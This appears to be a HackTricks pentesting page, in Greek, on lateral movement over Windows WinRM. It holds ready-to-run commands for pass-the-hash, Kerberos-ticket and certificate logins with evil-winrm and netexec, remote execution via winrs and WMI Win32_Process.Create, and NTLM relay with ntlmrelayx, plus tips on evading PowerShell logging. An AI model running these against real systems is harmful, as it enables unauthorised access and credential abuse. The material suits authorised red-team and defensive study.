# WinRM

{{#include ../../banners/hacktricks-training.md}}

Το WinRM είναι ένα από τα πιο βολικά transports **lateral movement** σε περιβάλλοντα Windows, επειδή σου δίνει ένα remote shell μέσω **WS-Man/HTTP(S)** χωρίς να χρειάζονται κόλπα δημιουργίας SMB service. Αν ο στόχος εκθέτει τα **5985/5986** και το principal σου επιτρέπεται να χρησιμοποιεί remoting, συχνά μπορείς να περάσεις από "valid creds" σε "interactive shell" πολύ γρήγορα.

Για το **protocol/service enumeration**, τους listeners, το enabling WinRM, το `Invoke-Command`, και τη γενική χρήση client, δες:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Γιατί οι operators προτιμούν το WinRM

- Χρησιμοποιεί **HTTP/HTTPS** αντί για SMB/RPC, οπότε συχνά δουλεύει εκεί όπου το PsExec-style execution μπλοκάρεται.
- Με **Kerberos**, αποφεύγει την αποστολή επαναχρησιμοποιήσιμων credentials στον στόχο.
- Λειτουργεί καθαρά από **Windows**, **Linux**, και **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Το interactive PowerShell remoting path εκκινεί το **`wsmprovhost.exe`** στον στόχο υπό το context του authenticated user, κάτι που operationally διαφέρει από service-based exec.

## Access model και prerequisites

Στην πράξη, το επιτυχημένο WinRM lateral movement εξαρτάται από **τρία** πράγματα:

1. Ο στόχος έχει ένα **WinRM listener** (`5985`/`5986`) και firewall rules που επιτρέπουν πρόσβαση.
2. Ο λογαριασμός μπορεί να **authenticate** στο endpoint.
3. Ο λογαριασμός επιτρέπεται να **open a remoting session**.

Συνηθισμένοι τρόποι για να αποκτήσεις αυτή την πρόσβαση:

- **Local Administrator** στον στόχο.
- Membership σε **Remote Management Users** σε νεότερα συστήματα ή **WinRMRemoteWMIUsers__** σε συστήματα/components που εξακολουθούν να τιμούν αυτό το group.
- Ρητά remoting rights που έχουν δοθεί μέσω local security descriptors / αλλαγών σε PowerShell remoting ACLs.

Αν ήδη ελέγχεις ένα box με admin rights, να θυμάσαι ότι μπορείς επίσης να **delegate WinRM access χωρίς πλήρες admin group membership** χρησιμοποιώντας τις τεχνικές που περιγράφονται εδώ:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas που μετρούν κατά το lateral movement

- Το **Kerberos απαιτεί hostname/FQDN**. Αν συνδεθείς με IP, ο client συνήθως πέφτει σε **NTLM/Negotiate**.
- Σε **workgroup** ή cross-trust edge cases, το NTLM συνήθως απαιτεί είτε **HTTPS** είτε ο στόχος να έχει προστεθεί στα **TrustedHosts** στον client.
- Με **local accounts** μέσω Negotiate σε workgroup, οι UAC remote restrictions μπορεί να εμποδίσουν την πρόσβαση εκτός αν χρησιμοποιείται ο built-in Administrator λογαριασμός ή `LocalAccountTokenFilterPolicy=1`.
- Το PowerShell remoting by default χρησιμοποιεί το **`HTTP/<host>` SPN**. Σε περιβάλλοντα όπου το `HTTP/<host>` είναι ήδη registered σε κάποιον άλλο service account, το WinRM Kerberos μπορεί να αποτύχει με `0x80090322`; χρησιμοποίησε a port-qualified SPN ή άλλαξε σε **`WSMAN/<host>`** όπου υπάρχει αυτό το SPN.

Αν αποκτήσεις valid credentials μέσω password spraying, το να τα validate-άρεις μέσω WinRM είναι συχνά ο πιο γρήγορος τρόπος για να δεις αν μεταφράζονται σε shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec για validation και one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM για διαδραστικά shells

Το `evil-winrm` παραμένει η πιο βολική διαδραστική επιλογή από Linux επειδή υποστηρίζει **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, μεταφορά αρχείων και φόρτωση PowerShell/.NET στη μνήμη.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Ακραία περίπτωση Kerberos SPN: `HTTP` vs `WSMAN`

Όταν το προεπιλεγμένο **`HTTP/<host>`** SPN προκαλεί αποτυχίες Kerberos, δοκίμασε να ζητήσεις/χρησιμοποιήσεις ένα ticket **`WSMAN/<host>`** αντί γι’ αυτό. Αυτό εμφανίζεται σε hardened ή περίεργα enterprise setups όπου το `HTTP/<host>` είναι ήδη δεμένο σε άλλο service account.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Αυτό είναι επίσης χρήσιμο μετά από κατάχρηση **RBCD / S4U** όταν έχετε συγκεκριμένα πλαστογραφήσει ή ζητήσει ένα **WSMAN** service ticket αντί για ένα γενικό `HTTP` ticket.

### Πιστοποίηση βάσει πιστοποιητικού

Το WinRM υποστηρίζει επίσης **client certificate authentication**, αλλά το πιστοποιητικό πρέπει να είναι mapped στον στόχο σε έναν **local account**. Από επιθετική σκοπιά, αυτό έχει σημασία όταν:

- έχετε κλέψει/exported ένα έγκυρο client certificate και private key που είναι ήδη mapped για WinRM;
- έχετε κάνει abuse του **AD CS / Pass-the-Certificate** για να αποκτήσετε ένα πιστοποιητικό για ένα principal και στη συνέχεια να pivot σε άλλο authentication path;
- λειτουργείτε σε περιβάλλοντα που αποφεύγουν σκόπιμα το password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Το Client-certificate WinRM είναι πολύ λιγότερο συνηθισμένο από το password/hash/Kerberos auth, αλλά όταν υπάρχει μπορεί να προσφέρει μια **passwordless lateral movement** διαδρομή που επιβιώνει από password rotation.

### Python / automation with `pypsrp`

Αν χρειάζεσαι automation αντί για operator shell, το `pypsrp` σου δίνει WinRM/PSRP από Python με υποστήριξη για **NTLM**, **certificate auth**, **Kerberos** και **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

Το `winrs.exe` είναι ενσωματωμένο και χρήσιμο όταν θέλεις **native WinRM command execution** χωρίς να ανοίξεις μια διαδραστική PowerShell remoting session:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Λειτουργικά, το `winrs.exe` συνήθως καταλήγει σε μια απομακρυσμένη αλυσίδα διεργασιών παρόμοια με την εξής:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Αξίζει να το θυμάστε, επειδή διαφέρει από service-based exec και από interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM αντί για PowerShell remoting

Μπορείτε επίσης να εκτελέσετε μέσω **WinRM transport** χωρίς `Enter-PSSession` καλώντας WMI classes over WS-Man. Αυτό διατηρεί το transport ως WinRM ενώ το remote execution primitive γίνεται **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Αυτή η προσέγγιση είναι χρήσιμη όταν:

- Το PowerShell logging παρακολουθείται έντονα.
- Θέλεις **WinRM transport** αλλά όχι ένα κλασικό PS remoting workflow.
- Χτίζεις ή χρησιμοποιείς custom tooling γύρω από το **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Όταν το SMB relay μπλοκάρεται από signing και το LDAP relay είναι περιορισμένο, το **WS-Man/WinRM** μπορεί ακόμα να είναι ελκυστικός relay target. Το σύγχρονο `ntlmrelayx.py` περιλαμβάνει **WinRM relay servers** και μπορεί να κάνει relay σε targets **`wsman://`** ή **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Δύο πρακτικές σημειώσεις:

- Το Relay είναι πιο χρήσιμο όταν ο στόχος δέχεται **NTLM** και το relayed principal επιτρέπεται να χρησιμοποιήσει WinRM.
- Ο πρόσφατος κώδικας του Impacket χειρίζεται ειδικά τα αιτήματα **`WSMANIDENTIFY: unauthenticated`**, ώστε τα probes τύπου `Test-WSMan` να μην σπάνε τη ροή του relay.

Για multi-hop constraints μετά από το πρώτο WinRM session, έλεγξε:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Σημειώσεις OPSEC και ανίχνευσης

- Το **interactive PowerShell remoting** συνήθως δημιουργεί **`wsmprovhost.exe`** στον στόχο.
- Το **`winrs.exe`** συνήθως δημιουργεί **`winrshost.exe`** και μετά το ζητούμενο child process.
- Περίμενε telemetry από **network logon**, events του WinRM service, και PowerShell operational/script-block logging αν χρησιμοποιείς PSRP αντί για raw `cmd.exe`.
- Αν χρειάζεσαι μόνο μία εντολή, το `winrs.exe` ή ένα one-shot WinRM execution μπορεί να είναι πιο αθόρυβα από ένα μακρόβιο interactive remoting session.
- Αν το Kerberos είναι διαθέσιμο, προτίμησε **FQDN + Kerberos** αντί για IP + NTLM για να μειώσεις τόσο τα trust issues όσο και τις άβολες αλλαγές στο `TrustedHosts` του client.

## Αναφορές

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
